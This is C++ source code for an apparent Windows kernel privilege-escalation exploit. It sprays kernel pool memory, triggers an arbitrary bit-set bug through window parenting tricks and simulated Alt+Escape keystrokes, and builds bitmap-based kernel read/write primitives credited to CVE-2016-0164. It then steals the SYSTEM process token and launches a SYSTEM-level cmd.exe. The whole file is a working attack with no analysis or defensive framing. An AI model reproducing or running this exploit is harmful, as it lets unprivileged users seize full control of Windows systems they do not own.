#include <iostream>
#include <Windows.h>
#include "helpers.h"

int arbitraryOr4(unsigned long long address);

DWORD WINAPI windowLoop(LPVOID address);
void simulateAltEscape(unsigned int times);

int initializePrimitives();

unsigned long long getNtoskrnlBase();
unsigned long long PsInitialSystemProcess();
void elevatePrivileges();

HWND gParentWindow = 0;
HWND gChildWindow = 0;
HANDLE gCreatedWindowsEvent = 0;

HBITMAP WORKER_BITMAP = 0;
HBITMAP MANAGER_BITMAP = 0;
char BOILERPLATE_DATA[0x1DF8];

int main() {
	sprayLargePool();

	unsigned long long managerSurface = (unsigned long long)leakLargePoolAllocationAddress();
	MANAGER_BITMAP = CreateBitmap(0x701, 0x2, 0x1, 8, 0);

	unsigned long long workerSurface = (unsigned long long)leakLargePoolAllocationAddress();
	WORKER_BITMAP = CreateBitmap(0x701, 0x2, 0x1, 8, 0);

	std::cout << "Manager bitmap should be located at:\t0x" << std::hex << managerSurface << std::endl;
	std::cout << "Worker bitmap should be located at:\t0x" << std::hex << workerSurface << std::endl;

	// 0x38 is the offset to sizlBitmap in SURFACE.
	unsigned long long targetAddress = managerSurface + 0x38 + 3;
	std::cout << "Attempting to trigger the atrbitrary-or-4 for address:\t0x" << targetAddress << std::endl;
	arbitraryOr4(targetAddress);

	DebugBreak();
	initializePrimitives();
	elevatePrivileges();
	system("cmd.exe");

	return 0;
}

int arbitraryOr4(unsigned long long address) {
	gCreatedWindowsEvent = CreateEventA(NULL, TRUE, FALSE, "CreateWindowsEvent");

	HANDLE thread = CreateThread(0, 0, windowLoop, &address, 0, 0);
	WaitForSingleObject(gCreatedWindowsEvent, INFINITE);
	WaitForSingleObject(thread, 1000);

	std::cout << "Trigerring vulnerability..." << std::endl;
	SwitchToThisWindow(gChildWindow, TRUE);
	SwitchToThisWindow(gParentWindow, TRUE);
	simulateAltEscape(2);

	return 0;
}

DWORD WINAPI windowLoop(LPVOID address) {
	WNDCLASSEXA mockClass = { 0 };
	mockClass.cbSize = sizeof(WNDCLASSEXA);
	mockClass.lpfnWndProc = DefWindowProcA;
	mockClass.lpszClassName = "Mock";

	RegisterClassExA(&mockClass);

	gParentWindow = CreateWindowExA(0, "Mock", "Parent!", WS_VISIBLE, 0, 0, 500, 500, 0, 0, 0, 0);
	gChildWindow = CreateWindowExA(0, "Mock", "Child!", WS_VISIBLE | WS_CHILD | WS_OVERLAPPEDWINDOW, 
								   150, 150, 200, 200, gParentWindow, 0, 0, 0);

	unsigned long long targetAddress = *(unsigned long long*)address - 0x28;
	SetWindowLongPtrA(gChildWindow, GWLP_ID, targetAddress);

	SetParent(gChildWindow, 0);

	SetEvent(gCreatedWindowsEvent);
	
	// Window loop
	BOOL r;
	MSG msg;
	do {
		r = GetMessageA(&msg, 0, 0, 0);
		TranslateMessage(&msg);
		DispatchMessageA(&msg);
	} while (1);

	return 0;
}

void simulateAltEscape(unsigned int times) {
	keybd_event(VK_MENU, 0xB8, 0, 0);
	for (unsigned int i = 0; i < times; ++i) {
		keybd_event(VK_ESCAPE, 0x81, 0, 0);
		keybd_event(VK_ESCAPE, 0x81, KEYEVENTF_KEYUP, 0);
	}
	keybd_event(VK_MENU, 0xB8, KEYEVENTF_KEYUP, 0);
}

int initializePrimitives() {
	auto bytesRead = GetBitmapBits(MANAGER_BITMAP, sizeof(BOILERPLATE_DATA), &BOILERPLATE_DATA);
	if (bytesRead != sizeof(BOILERPLATE_DATA)) {
		return -1;
	}
	return 0;
}

// Primitives taken from CVE-2016-0164
unsigned long long readQword(unsigned long long address) {
	unsigned long long data = 0;
	*((unsigned long long*)&BOILERPLATE_DATA[sizeof(BOILERPLATE_DATA) - 8]) = address;
	SetBitmapBits(MANAGER_BITMAP, sizeof(BOILERPLATE_DATA), BOILERPLATE_DATA);
	GetBitmapBits(WORKER_BITMAP, 8, &data);
	return data;
}

void writeQword(unsigned long long address, void* data) {
	*((unsigned long long*)&BOILERPLATE_DATA[sizeof(BOILERPLATE_DATA) - 8]) = address;
	SetBitmapBits(MANAGER_BITMAP, sizeof(BOILERPLATE_DATA), BOILERPLATE_DATA);
	SetBitmapBits(WORKER_BITMAP, 8, data);
}

// Finding System process & elevating privileges taken from Win10GdiExploitation
unsigned long long getNtoskrnlBase() {
	unsigned long long baseAddress = 0;

	unsigned long long ntAddress = readQword(0xffffffffffd00448) - 0x110000;
	unsigned long long signature = 0x00905a4d;
	unsigned long long searchAddress = ntAddress & 0xfffffffffffff000;

	while (true) {
		unsigned long long readData = readQword(searchAddress);
		if ((readData & 0x00000000FFFFFFFF) == signature) {
			baseAddress = searchAddress;
			break;
		}
		searchAddress = searchAddress - 0x1000;
	}

	return baseAddress;
}

unsigned long long PsInitialSystemProcess() {
	unsigned long long systemProcessAddress;

	unsigned long long kernelNtos = getNtoskrnlBase();
	std::cout << "ntoskrnl.exe Base: 0x" << std::hex << kernelNtos << std::endl;
	void* userNtos = LoadLibraryA("ntoskrnl.exe");
	systemProcessAddress = kernelNtos +
		((unsigned long long)GetProcAddress((HMODULE)userNtos, "PsInitialSystemProcess") - (unsigned long long)userNtos);
	std::cout << "System process is at 0x" << std::hex << systemProcessAddress << std::endl;
	return readQword(systemProcessAddress);
}

void elevatePrivileges() {
	unsigned long long systemProcess;
	unsigned long long currentProcess;
	void* systemToken;
	unsigned long pid;
	//unsigned long long tokenOffset = offsetof(_EPROCESS, Token);
	//unsigned long long activeProcessLinksOffset = offsetof(_EPROCESS, ActiveProcessLinks);
	//unsigned long long pidOffset = offsetof(_EPROCESS, UniqueProcessId);
	unsigned long long tokenOffset = 0x358;
	unsigned long long activeProcessLinksOffset = 0x2f0;
	unsigned long long pidOffset = 0x2e8;
	unsigned long currentPid = GetCurrentProcessId();

	systemProcess = PsInitialSystemProcess();
	std::cout << "Found system process at 0x" << std::hex << systemProcess << std::endl;
	systemToken = (void*)readQword(systemProcess + tokenOffset);
	std::cout << "Found system token at 0x" << std::hex << systemToken << std::endl;

	currentProcess = systemProcess;
	do {
		currentProcess = readQword(currentProcess + activeProcessLinksOffset) - activeProcessLinksOffset;
		pid = readQword(currentProcess + pidOffset);
	} while (pid != currentPid);

	std::cout << "Found current process at 0x" << std::hex << currentProcess << std::endl;
	writeQword(currentProcess + tokenOffset, &systemToken);
}